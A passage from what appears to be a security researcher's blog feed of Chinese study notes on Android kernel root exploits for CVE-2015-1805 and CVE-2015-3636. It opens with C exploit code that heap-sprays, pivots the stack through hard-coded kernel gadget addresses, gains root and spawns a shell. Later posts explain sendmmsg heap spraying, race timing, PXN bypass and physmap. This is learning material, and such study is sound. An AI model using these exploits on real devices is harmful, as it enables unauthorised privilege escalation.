class="line">bzero(&amp;server_addr,<span class="keyword">sizeof</span>(server_addr));</span><br><span class="line">server_addr.sin_family=AF_INET;</span><br><span class="line"><span class="keyword">if</span>(inet_aton(<span class="string">"127.0.0.1"</span>,&amp;server_addr.sin_addr)==<span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[Client]Server IP Address error\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">server_addr.sin_port=htons(HELLO_WORLD_SERVER_PORT);</span><br><span class="line"><span class="keyword">socklen_t</span> server_addr_length=<span class="keyword">sizeof</span>(server_addr);</span><br><span class="line"><span class="keyword">if</span>(connect(client_socket,(struct sockaddr*)&amp;server_addr,server_addr_length)&lt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[Client]cannot connect to 127.0.0.1!\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[Client]Close client socket\n"</span>);</span><br><span class="line">close(client_socket);</span><br><span class="line">client_finish=<span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">func_modify</span><span class="params">(<span class="keyword">void</span> *arg)</span></span>&#123; </span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> * addr = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> func = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)Stack_Pivot_addr;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">addr = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *)Heap_Spray_Addr;</span><br><span class="line">    addr[<span class="number">0</span>] = <span class="number">0x0</span>;</span><br><span class="line">    addr[<span class="number">1</span>] = <span class="number">0x0a0a02e0</span>;</span><br><span class="line">    addr[<span class="number">2</span>] = <span class="number">0x00000002</span>;</span><br><span class="line">        addr[<span class="number">3</span>] = <span class="number">0x0</span>;</span><br><span class="line">    addr[<span class="number">4</span>] = <span class="number">0x0</span>;</span><br><span class="line">    addr[<span class="number">5</span>] = func;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">pid = getpid();</span><br><span class="line"><span class="keyword">if</span>(<span class="number">-1</span> == maximize_fd_limit())</span><br><span class="line"> &#123;</span><br><span class="line">perror(<span class="string">"[*] maximize socket limit fail"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> new_esp_addr = <span class="number">0x78185b8</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> new_esp_addr_fix = new_esp_addr &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> *new_esp_addr_fix_mmap = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *)mmap((<span class="keyword">void</span>*)new_esp_addr_fix, <span class="number">1024</span>*<span class="number">2048</span>, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS , <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (new_esp_addr_fix_mmap == MAP_FAILED)&#123;</span><br><span class="line">perror(<span class="string">"Failed to mmap: "</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> *p_new_esp_addr = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *)new_esp_addr;</span><br><span class="line">p_new_esp_addr[<span class="number">0</span>] = <span class="number">0xffffffff8176e2b0</span>;</span><br><span class="line">p_new_esp_addr[<span class="number">1</span>] = <span class="number">0xffffffff810d7d24</span>;</span><br><span class="line">p_new_esp_addr[<span class="number">2</span>] = <span class="number">0x06f0</span>;</span><br><span class="line">p_new_esp_addr[<span class="number">3</span>] = <span class="number">0xffffffff81003d68</span>;</span><br><span class="line">p_new_esp_addr[<span class="number">4</span>] = new_esp_addr + <span class="number">0x3000</span>;</span><br><span class="line">p_new_esp_addr[<span class="number">5</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)&amp;get_root;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>  fix_addr = Heap_Spray_Addr &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> * addr = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *)mmap((<span class="keyword">void</span>*)fix_addr, <span class="number">1024</span>*<span class="number">100</span>, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS , <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (addr == MAP_FAILED)&#123;</span><br><span class="line">        perror(<span class="string">"Failed to mmap: "</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> func = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)&amp;get_root;</span><br><span class="line">addr = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *)Heap_Spray_Addr;</span><br><span class="line">    addr[<span class="number">0</span>] = <span class="number">0x0</span>;</span><br><span class="line">    addr[<span class="number">1</span>] = <span class="number">0x0a0a02e0</span>;</span><br><span class="line">    addr[<span class="number">2</span>] = <span class="number">0x00000002</span>;</span><br><span class="line">    addr[<span class="number">3</span>] = <span class="number">0x0</span>;</span><br><span class="line">    addr[<span class="number">4</span>] = <span class="number">0x0</span>;</span><br><span class="line">    addr[<span class="number">5</span>] = func;</span><br><span class="line"><span class="keyword">pthread_t</span> id_modify;</span><br><span class="line">pthread_create(&amp;id_modify,<span class="literal">NULL</span>,func_modify,<span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">pthread_t</span> id_server,id_client;</span><br><span class="line">pthread_create(&amp;id_server,<span class="literal">NULL</span>,server,<span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">while</span>(!server_init)&#123;</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">pthread_create(&amp;id_client,<span class="literal">NULL</span>,client,<span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">while</span>(!server_finish || !client_finish)&#123;</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">" current uid is : %d \n"</span>, getuid());</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">" current euid is : %d \n"</span>, geteuid());</span><br><span class="line"></span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://imkira.com/a21.html" target="_blank" rel="noopener">https://imkira.com/a21.html</a><br><a href="https://blog.csdn.net/zhaihaifei/article/details/58624063" target="_blank" rel="noopener">https://blog.csdn.net/zhaihaifei/article/details/58624063</a><br><a href="http://pwn4.fun/2017/04/17/Linux%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%88%E4%B8%80%EF%BC%89%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/" target="_blank" rel="noopener">http://pwn4.fun/2017/04/17/Linux%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%88%E4%B8%80%EF%BC%89%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</a><br><a href="https://mp.weixin.qq.com/s/6NGH-Dk2n_BkdlJ2jSMWJQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/6NGH-Dk2n_BkdlJ2jSMWJQ</a><br><a href="https://bbs.pediy.com/thread-226057.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-226057.htm</a><br><a href="http://www.freebuf.com/articles/terminal/160041.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/terminal/160041.html</a><br><a href="https://xz.aliyun.com/t/2385?accounttraceid=97124e15-b6b6-471a-919a-fd079c81cdbf" target="_blank" rel="noopener">https://xz.aliyun.com/t/2385?accounttraceid=97124e15-b6b6-471a-919a-fd079c81cdbf</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;一直想搞这个洞,因为这是一个比较新的,影响力比较大的一个洞了,之前的两个2015的洞稍微有些久,这个是比较近的一个漏洞了.&lt;br&gt;手上没手机
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>CVE-2015-1805(iovyroot)</title>
    <link href="https://foyjog.github.io/2018/08/27/CVE-2015-1805-iovyroot/"/>
    <id>https://foyjog.github.io/2018/08/27/CVE-2015-1805-iovyroot/</id>
    <published>2018-08-27T08:15:52.000Z</published>
    <updated>2018-08-27T09:43:10.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>这个root是大佬发给我看的,帖子来源于<a href="https://bbs.pediy.com/thread-210503.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-210503.htm</a> 看雪论坛,给了一个exp文件可以实现提权.但是这个确实花了一番功夫折腾,起初看的有点儿蒙蔽的意思,但是慢慢看就还是能够看明白的.</p><p>这里还是只写一些我遇到的问题,说实话博客这东西确实得写一写,不然过一阵子你就忘了之前你看的那些东西,然后没有博客的话你还无从记起.所以记录一下还是很有必要的.</p><h3 id="关于pipe-read中的chars"><a href="#关于pipe-read中的chars" class="headerlink" title="关于pipe_read中的chars"></a>关于pipe_read中的chars</h3><p>这个一开始懵逼在这儿了,愣是没明白chars为什么就是0x1000,后来我看了看代码,才发现chars其实是buf-&gt;len.而这个buf是pipe_buffer,pipe_buffer的结构体如下:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *struct pipe_buffer - a linux kernel pipe buffer</span></span><br><span class="line"><span class="comment"> *@page: the page containing the data for the pipe buffer</span></span><br><span class="line"><span class="comment"> *@offset: offset of data inside the @page</span></span><br><span class="line"><span class="comment"> *@len: length of data inside the @page</span></span><br><span class="line"><span class="comment"> *@ops: operations associated with this buffer. See @pipe_buf_operations.</span></span><br><span class="line"><span class="comment"> *@flags: pipe buffer flags. See above.</span></span><br><span class="line"><span class="comment"> *@private: private data owned by the ops.</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> offset, len;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> flags;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">private</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>注释写的比较明白,length of data inside the @page,一般来说一个page_size在32位的机器上是4096,即0x1000.只要我们之前通过pipe_write()写入的字节够数,就会写满一个page,也就是0x1000.</p><h3 id="关于通过sendmmsg堆喷"><a href="#关于通过sendmmsg堆喷" class="headerlink" title="关于通过sendmmsg堆喷"></a>关于通过sendmmsg堆喷</h3><p>这里面通过sendmmsg堆喷为什么管用的解释如下:(科恩分享的安卓内核UAF漏洞利用探秘)</p><blockquote><p>iovec 是数据内核中传递数据的结构。这个漏洞本身是 overrun，牵涉到我们在内核当中如何申请可控的overrun 数组。在安卓当中，很多 API 是被禁用的。最终我们找到 sendmmsg 的调用，你可以得到内容完全可控的数组。 它的坏处是放完以后就被销毁掉了。这个对象本身的生命周期不够长。看似这不是很好的对象，实际上可以回想起之前的一点，在 slub 中一个对象被释放之后，仅仅是在对象的头部写入了指针，这个指针指向下一个可以使用的对象。2015-1805 的代码路径当中，如果 iov 是 0，根本就不会被处理。如果说喷射的够快，漏洞利用过程够快，被释放掉的 iov 本身还是空的对象，或者又被另一个 iov 填上，根本不会对漏洞造成任何影响。我们只需要控制填进去的第一个 iov 的长度是 0，它就会被忽略掉。即便被释放，这个结果还是有效的 iov。</p></blockquote><p>所以这里面采用了sendmmsg堆喷,通过查看sendmmsg源码可以发现,一直可以调用到如下语句:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">   iov_size = msg_sys-&gt;msg_iovlen * <span class="keyword">sizeof</span>(struct iovec);</span><br><span class="line"><span class="keyword">if</span> (msg_sys-&gt;msg_iovlen &gt; UIO_FASTIOV) &#123;</span><br><span class="line">iov = sock_kmalloc(sock-&gt;sk, iov_size, GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!iov)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>通过sock_kmalloc()在内核中分配一个iov_size为msg_iovlen ✖️ sizeof(struct iovec)的内存块,通过控制msg_iovlen = 0x200,即可喷射一个0x200*8=0x1000的块.<br>同时在<a href="http://h3ysatan.blogspot.com/2016/04/iovyroot-cve-2015-1805.html" target="_blank" rel="noopener">http://h3ysatan.blogspot.com/2016/04/iovyroot-cve-2015-1805.html</a> 中看到</p><blockquote><p> 在rw_copy_check_uvector()函数里，首先会检查传入参数nr_segs（也就是iovcnt），是不是合法，如果nr_segs小于8，就使用栈上的iovstack；如果大于8，就kmalloc出一块新的内存作为iovstack。然后用copy_from_user()把用户态的iovec数组拷到内核态。这个iovstack会在后面调用read_pipe()的时候作为iov参数传入。</p></blockquote><p>可以通过利用pipe_read()传入0x200个iovec在内存中对齐一个页,所以这让堆喷变得十分的恰到好处.</p><h3 id="关于race-condition和三次pipe-iov-copy-to-user调用"><a href="#关于race-condition和三次pipe-iov-copy-to-user调用" class="headerlink" title="关于race_condition和三次pipe_iov_copy_to_user调用"></a>关于race_condition和三次pipe_iov_copy_to_user调用</h3><p>race_condition让该root具有一个成功率的问题,通过调试readv()的字节数,可以让成功率增加.<br>至于为什么一定要三次copy呢?这里Retme的博客里面讲得非常清楚了.</p><blockquote><p>不能在loop_time = 2的时候触发overrun,否则overrun会使用copy_to_user而不是__copy_to_user,那么还是无法写内核地址解决办法是让total_len 稍稍大于 buf-&gt;len(0x1000)这样loop_time = 2的时候能保证把一个合法的buf-&gt;len读完。并且会因为buf-&gt;len被读完，tolen_len却还有剩余，而进入第三个loop然后在loop_time = 3的时候走atomic=1的路线，进行越界使用iov</p></blockquote><p>!iov_fault_in_pages_write(iov, chars)只是检查内存空间是否有写权限,并不判断是否为内核空间,因为其调用的是__put_user(0, uaddr),而copy_to_user()中的access_ok是会检查要操作的用户空间的地址范围是否在当前进程的用户地址空间限制中。这可以参考博客: <a href="https://blog.csdn.net/ysgjiangsu/article/details/50380728" target="_blank" rel="noopener">https://blog.csdn.net/ysgjiangsu/article/details/50380728</a><br>而三次pipe_iov_copy_to_user的调用大致情况如下:<br><img src="/img/race_condition.png" alt="raceconditon"></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://www.kejilie.com/leiphone/article/Q7RrAj.html" target="_blank" rel="noopener">http://www.kejilie.com/leiphone/article/Q7RrAj.html</a><br><a href="http://luodw.cc/2016/08/01/pipeof/" target="_blank" rel="noopener">http://luodw.cc/2016/08/01/pipeof/</a><br><a href="https://bbs.pediy.com/thread-210503.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-210503.htm</a><br><a href="http://h3ysatan.blogspot.com/2016/04/iovyroot-cve-2015-1805.html" target="_blank" rel="noopener">http://h3ysatan.blogspot.com/2016/04/iovyroot-cve-2015-1805.html</a><br><a href="http://www.cnblogs.com/jiayy/p/4831844.html" target="_blank" rel="noopener">http://www.cnblogs.com/jiayy/p/4831844.html</a><br><a href="https://blog.csdn.net/ysgjiangsu/article/details/50380728" target="_blank" rel="noopener">https://blog.csdn.net/ysgjiangsu/article/details/50380728</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;这个root是大佬发给我看的,帖子来源于&lt;a href=&quot;https://bbs.pediy.com/thread-210503.htm&quot; 
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>CVE-2015-3636(pingpong root)</title>
    <link href="https://foyjog.github.io/2018/08/19/CVE-2015-3636-pingpong-root/"/>
    <id>https://foyjog.github.io/2018/08/19/CVE-2015-3636-pingpong-root/</id>
    <published>2018-08-19T13:42:25.000Z</published>
    <updated>2018-08-19T14:24:34.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>辞职了,两个月真的是非常的快,感觉啥也没做就已经离开公司了,虽然日常经常做一些重复性,感觉没有很多技术含量的事情,但其实不知不觉能力得到了一定的提升的.<br>所以,时间多出来了,就跑跑一些cve了,工作两个月,跑了那么久的fuzz,都没有好好的跑过一个通用型高的root方案,真是惭愧,刚好看雪安全论坛出了一个关于cve-2015-3636的帖子,写的甚是详细(感谢大佬),所以就拿来跑一波,感受一下当年的神级洞的魅力.</p><h3 id="关于利用"><a href="#关于利用" class="headerlink" title="关于利用"></a>关于利用</h3><p>根据该文章:<a href="https://blog.csdn.net/koozxcv/article/details/50976884" target="_blank" rel="noopener">https://blog.csdn.net/koozxcv/article/details/50976884</a> 的讲解,还是能够比较容易的明白该漏洞存在的问题的.这是一个可以说是非常完美的uaf的漏洞,因为uaf的对象是一个sock结构体,这个sock结构体中包含了大量的函数指针,所以这对我们利用来说就非常的舒服了.而整个漏洞的利用过程就可以参考<a href="https://bbs.pediy.com/thread-230298.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-230298.htm</a> 这篇文章了,非常详细具体,大佬威武.所以跟着这两篇文章我还是把整个流程也走了一遍.两篇文章写的非常的详细,所以在这里记录一下我自己遇到的一些问题.</p><h3 id="关于补丁的作用"><a href="#关于补丁的作用" class="headerlink" title="关于补丁的作用"></a>关于补丁的作用</h3><p>补丁就一行.目的是将node-&gt;pprev = NULL;<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sk_nulls_node_init(&amp;sk-&gt;sk_nulls_node);</span><br></pre></td></tr></table></figure></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> __<span class="function">inline__ <span class="keyword">void</span> <span class="title">sk_nulls_node_init</span><span class="params">(struct hlist_nulls_node *node)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">node-&gt;pprev = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们知道,该uaf是因为两次connect函数导致了sk_free(sk)函数的执行,所以将node-&gt;pprev = NULL之后,<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (sk_hashed(sk)) &#123;</span><br><span class="line">write_lock_bh(&amp;ping_table.lock);</span><br><span class="line">hlist_nulls_del(&amp;sk-&gt;sk_nulls_node);</span><br><span class="line">sk_nulls_node_init(&amp;sk-&gt;sk_nulls_node);</span><br><span class="line">sock_put(sk);</span><br><span class="line">isk-&gt;inet_num = <span class="number">0</span>;</span><br><span class="line">isk-&gt;inet_sport = <span class="number">0</span>;</span><br><span class="line">sock_prot_inuse_add(sock_net(sk), sk-&gt;sk_prot, <span class="number">-1</span>);</span><br><span class="line">write_unlock_bh(&amp;ping_table.lock);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">hlist_unhashed</span><span class="params">(<span class="keyword">const</span> struct hlist_node *h)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> !h-&gt;pprev;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">sk_unhashed</span><span class="params">(<span class="keyword">const</span> struct sock *sk)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> hlist_unhashed(&amp;sk-&gt;sk_node);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">sk_hashed</span><span class="params">(<span class="keyword">const</span> struct sock *sk)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> !sk_unhashed(sk);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>sk_hashed(sk)就不会判断为真,那么第二次的connect就不会执行sock_put(sk)函数,也就不会触发free函数了.</p><h3 id="绕过pxn和泄漏sp指针"><a href="#绕过pxn和泄漏sp指针" class="headerlink" title="绕过pxn和泄漏sp指针"></a>绕过pxn和泄漏sp指针</h3><p>pxn的绕过感觉是比较有技术含量的一个点了,但是其实文章中都讲的比较清楚,所以参考<a href="https://github.com/jianqiangzhao/mosec2016/blob/master/Android%20Root%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF%E6%BC%AB%E8%B0%88%EF%BC%9A%E7%BB%95%E8%BF%87PXN.ppt" target="_blank" rel="noopener">https://github.com/jianqiangzhao/mosec2016/blob/master/Android%20Root%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF%E6%BC%AB%E8%B0%88%EF%BC%9A%E7%BB%95%E8%BF%87PXN.ppt</a> 也就能比较清楚的了解该pxn绕过方法了,泄漏sp指针采用了一个gadget,说实话找到内核中有这么个gadget真的是666了.这其中采用了pipe管道通信的方式来读写内核的任意地址是第一次见(毕竟第一次调试cve= =),要好好记下来.</p><h3 id="关于Physmap的利用方式"><a href="#关于Physmap的利用方式" class="headerlink" title="关于Physmap的利用方式"></a>关于Physmap的利用方式</h3><p>虽然这个利用方式现在是不奏效了,但是当时能够想到这个方法大佬真是巨牛逼了.这里我一直有个疑问,slab分配的sock结构体的地址是在内核地址当中的,当我调试的时候发现返回的地址都在用户空间中.(mmap肯定返回一个用户地址的= =)<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">   *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)((<span class="keyword">char</span> *)payload + <span class="number">0x28</span>)  = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)payload;</span><br><span class="line">*(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)((<span class="keyword">char</span> *)payload)         = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)<span class="number">0xFFFFFFC00035D788</span>;</span><br><span class="line">*(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)((<span class="keyword">char</span> *)payload + <span class="number">0x68</span>)  = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)<span class="number">0xFFFFFFC00035D7C0</span>;</span><br></pre></td></tr></table></figure></p><p>通过查看0xffffffc02e860000的内核空间和0x0000007082ea9000的用户空间发现他们是一样的.<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gef&gt; x/<span class="number">50</span>g <span class="number">0x0000007082ea9000</span></span><br><span class="line"><span class="number">0x7082ea9000</span>:<span class="number">0xffffffc00035d788</span><span class="number">0x4141414141414141</span></span><br><span class="line"><span class="number">0x7082ea9010</span>:<span class="number">0x4141414141414141</span><span class="number">0x4141414141414141</span></span><br><span class="line"><span class="number">0x7082ea9020</span>:<span class="number">0x4141414141414141</span><span class="number">0x0000007082ea9000</span></span><br><span class="line"><span class="number">0x7082ea9030</span>:<span class="number">0x4141414141414141</span><span class="number">0x4141414141414141</span></span><br><span class="line"><span class="number">0x7082ea9040</span>:<span class="number">0x4141414141414141</span><span class="number">0x4141414141414141</span></span><br><span class="line"><span class="number">0x7082ea9050</span>:<span class="number">0x4141414141414141</span><span class="number">0x4141414141414141</span></span><br><span class="line"><span class="number">0x7082ea9060</span>:<span class="number">0x4141414141414141</span><span class="number">0xffffffc00035d7c0</span></span><br></pre></td></tr></table></figure></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gef&gt; x/<span class="number">50</span>g <span class="number">0xffffffc02e860000</span></span><br><span class="line"><span class="number">0xffffffc02e860000</span>:<span class="number">0xffffffc00035d788</span><span class="number">0x4141414141414141</span></span><br><span class="line"><span class="number">0xffffffc02e860010</span>:<span class="number">0x4141414141414141</span><span class="number">0x4141414141414141</span></span><br><span class="line"><span class="number">0xffffffc02e860020</span>:<span class="number">0x4141414141414141</span><span class="number">0x0000007082ea9000</span></span><br><span class="line"><span class="number">0xffffffc02e860030</span>:<span class="number">0x4141414141414141</span><span class="number">0x4141414141414141</span></span><br><span class="line"><span class="number">0xffffffc02e860040</span>:<span class="number">0x4141414141414141</span><span class="number">0x4141414141414141</span></span><br><span class="line"><span class="number">0xffffffc02e860050</span>:<span class="number">0x4141414141414141</span><span class="number">0x4141414141414141</span></span><br><span class="line"><span class="number">0xffffffc02e860060</span>:<span class="number">0x4141414141414141</span><span class="number">0xffffffc00035d7c0</span></span><br></pre></td></tr></table></figure><p>在<a href="https://paper.seebug.org/451/" target="_blank" rel="noopener">https://paper.seebug.org/451/</a> 文章中,解释了有一段名为physmap的内核内存，其中内核保留一个映射到与用户区内存具有相同物理内存的“alias”（虚拟地址）。因此，在用户区创建一个填充0x41的页面后，内核中确实存在一个可以找到与该页面完全相同的网页地址。</p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>调试的命令通过增加-verbose -show-kernel命令可以从输出中看到如下模拟语句,<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./qemu/linux-x86_64/qemu-system-aarch64 -cpu cortex-a57 -machine <span class="built_in">type</span>=ranchu -m 1024 -append <span class="string">'console=ttyAMA0,38400 keep_bootcon earlyprintk=ttyAMA0'</span> -serial mon:stdio -kernel .//Image -initrd .//ramdisk.img -drive index=0,id=sdcard,file=.//system.img -device virtio-blk-device,drive=sdcard -drive index=1,id=userdata,file=.//.//userdata.img -device virtio-blk-device,drive=userdata -drive index=2,id=cache,file=.//cache.img -device virtio-blk-device,drive=cache -drive index=3,id=system,file=.//system.img -device virtio-blk-device,drive=system -netdev user,id=mynet -device virtio-net-device,netdev=mynet -show-cursor -nographic -L lib/pc-bios</span><br></pre></td></tr></table></figure></p><p>然后增加-s -S命令即可顺利调试.</p><h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><p><a href="https://blog.csdn.net/koozxcv/article/details/50976884" target="_blank" rel="noopener">https://blog.csdn.net/koozxcv/article/details/50976884</a><br><a href="https://paper.seebug.org/451/" 